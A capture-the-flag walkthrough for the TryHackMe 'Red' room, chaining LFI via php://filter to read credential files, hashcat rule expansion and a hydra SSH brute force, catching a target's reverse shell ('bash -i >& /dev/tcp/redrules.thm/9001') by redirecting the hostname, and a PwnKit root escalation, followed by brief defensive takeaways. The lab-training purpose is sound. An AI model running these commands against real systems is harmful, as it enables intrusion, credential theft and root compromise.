# TryHackMe — Red (Easy) Walkthrough

> Room: **Red** (Easy)  
> Goal: Get `flag1`, `flag2`, then escalate to `root` for the final flag.

This box is a clean chain:
**Nmap → LFI → local credential discovery → SSH → process abuse for shell as red → local privesc (pkexec/PwnKit)**

---

## 1) Recon (Nmap)

Run a full TCP scan with default scripts and version detection:

```/dev/null/nmap.txt#L1-1
nmap -p- -sC -sV -T4 --min-rate=1000 -oN nmap_scan.txt <IP_ADDRESS>
```

### Results (key ports)

- `22/tcp` — SSH (OpenSSH 8.2p1)
- `80/tcp` — HTTP (Apache 2.4.41)

The HTTP title indicates the app loads content via a query parameter:

- `/index.php?page=home.html`

That `?page=` pattern is a classic signal to test for **LFI (Local File Inclusion)**.

---

## 2) Web exploitation: Local File Inclusion (LFI)

### 2.1 Confirm the LFI behavior

The app loads local HTML pages via the `page` parameter. Attempting traversal like:

- `?page=../../../../etc/passwd`

may fail due to filtering or path normalization. If direct traversal doesn’t work, move to more reliable techniques.

### 2.2 Use PHP filter wrapper to read files

A common LFI trick is using PHP’s `php://filter` wrapper to base64-encode the target file before output, which can bypass some filters and avoid breaking page rendering.

Use:

- `php://filter/convert.base64-encode/resource=...`

In this box, doing it in the browser didn’t display usable output, but `curl` did.

Fetch and decode `/etc/passwd` like this:

```/dev/null/lfi_passwd.txt#L1-2
curl -s "http://<IP_ADDRESS>/index.php?page=php://filter/convert.base64-encode/resource=etc/passwd" | base64 -d
```

> Note: In some apps you may need `resource=../../../../etc/passwd`. Here `resource=etc/passwd` worked because the application’s include path / working directory allowed it.

### 2.3 Identify users

From `/etc/passwd`, you should see at least these local users:

- `blue`
- `red`

Now use LFI to read interesting local files, especially in home directories.

---

## 3) Credential discovery via LFI (blue user)

A high-signal target is shell history:

- `/home/blue/.bash_history`

Read it using the same PHP filter + curl approach:

```/dev/null/lfi_blue_history.txt#L1-2
curl -s "http://<IP_ADDRESS>/index.php?page=php://filter/convert.base64-encode/resource=home/blue/.bash_history" | base64 -d
```

The history showed commands like:

- generating a password list using Hashcat rules (`best64.rule`)
- using a file named `.reminder`

Example logic seen:

- `.reminder` contains a base string (seed)
- hashcat applies `best64.rule` transformations to generate a candidate list

So next, read `.reminder`:

```/dev/null/lfi_blue_reminder.txt#L1-2
curl -s "http://<IP_ADDRESS>/index.php?page=php://filter/convert.base64-encode/resource=home/blue/.reminder" | base64 -d
```

The `.reminder` content was:

- `sup3r_p@s$w0rd!`

This doesn’t necessarily mean that is the final SSH password — the history implies it was transformed with rules.

---

## 4) Recreate the Hashcat rule expansion (attacker machine)

Create a file with the reminder seed:

```/dev/null/seed.txt#L1-1
echo 'sup3r_p@s$w0rd!' > seed.txt
```

Generate candidates using Hashcat’s `best64` rule:

```/dev/null/hashcat_gen.txt#L1-1
hashcat --stdout seed.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt
```

Now you have a password list that mirrors what the user generated on the box.

---

## 5) SSH brute-force with the derived wordlist (blue)

Use `hydra` to try SSH passwords for user `blue`:

```/dev/null/hydra.txt#L1-1
hydra -l blue -P passlist.txt <IP_ADDRESS> ssh
```

Once Hydra finds a working password, SSH in:

```/dev/null/ssh_blue.txt#L1-1
ssh blue@<IP_ADDRESS>
```

Grab `flag1` (typically in the user’s home directory).

---

## 6) Pivot to user `red` (process abuse + host redirection)

### 6.1 Enumerate running processes

As `blue`, check processes:

```/dev/null/ps.txt#L1-1
ps aux
```

You should spot something suspicious being executed as `red`, similar to:

- `bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&`

This is a reverse shell attempt from the target to the hostname `redrules.thm` on port `9001`.

### 6.2 Why this works

The target is trying to connect out to `redrules.thm`. If you can control where `redrules.thm` resolves (DNS/hosts), you can redirect that connection to **your attacker IP**, catch the shell, and become `red`.

### 6.3 Set up host resolution (attacker machine)

Add an entry so `redrules.thm` resolves to your attacker machine:

```/dev/null/hosts.txt#L1-2
sudo sh -c 'echo "<YOUR_IP> redrules.thm" >> /etc/hosts'
tail -n 2 /etc/hosts
```

### 6.4 Start a listener

Listen on port `9001`:

```/dev/null/nc9001.txt#L1-1
nc -lvnp 9001
```

Wait. When the process triggers/loops, it should connect to you, giving a shell as `red`.

Grab `flag2`.

---

## 7) Privilege escalation to root (pkexec / PwnKit)

### 7.1 Find the pkexec binary

In `red`’s directory, there was a `.git` folder containing a `pkexec` binary (non-standard location). This is important because many public exploits assume the binary is at:

- `/usr/bin/pkexec`

In this room, it was found at something like:

- `/home/red/.git/pkexec`

Confirm location with:

```/dev/null/find_pkexec.txt#L1-1
find / -name pkexec 2>/dev/null
```

### 7.2 Vulnerability: CVE-2021-4034 (PwnKit)

`pkexec` (part of PolicyKit / polkit) is historically vulnerable to **CVE-2021-4034**, a local privilege escalation that can yield a root shell if the binary is vulnerable.

**Conceptually:**
- `pkexec` can be tricked via environment/argument handling into executing attacker-controlled code as root.

### 7.3 Run a known exploit (adjust path if needed)

Most public PoCs hardcode `/usr/bin/pkexec`. If your `pkexec` is in `/home/red/.git/pkexec`, update the exploit to use that path.

High-level workflow:
1. Transfer the exploit to the box (e.g., using a simple HTTP server + `wget`)
2. Compile/run as instructed by the PoC
3. Ensure the exploit points at the correct `pkexec` path
4. Execute → obtain a root shell

Once you have a root shell:

```/dev/null/whoami_root.txt#L1-2
whoami
id
```

Retrieve the final flag.

---

## 8) Summary (attack chain)

1. `nmap` → find `22/ssh` and `80/http`
2. Web analysis → `?page=` suggests LFI
3. Use PHP filter wrapper + `curl` to read `/etc/passwd`
4. Identify users: `blue`, `red`
5. LFI → read `/home/blue/.bash_history` and `.reminder`
6. Recreate Hashcat rule expansion (`best64.rule`) → generate password candidates
7. Hydra SSH brute force → login as `blue` → `flag1`
8. `ps aux` reveals red’s reverse shell to `redrules.thm:9001`
9. Map `redrules.thm` to your attacker IP + listen on 9001 → shell as `red` → `flag2`
10. PrivEsc: exploit vulnerable `pkexec` (CVE-2021-4034), adjusting for non-standard path → root → final flag

---

## Notes / Defensive takeaways (brief)

- Never build file includes from user input without strict allow-lists.
- Treat any `php://filter` exposure as “read-any-file” severity.
- Don’t leave credential workflows in shell history (and lock down home directory permissions).
- Don’t run long-lived reverse shell processes; monitor abnormal outbound connections.
- Patch polkit / remove vulnerable `pkexec` binaries; restrict SUID binaries and audit them regularly.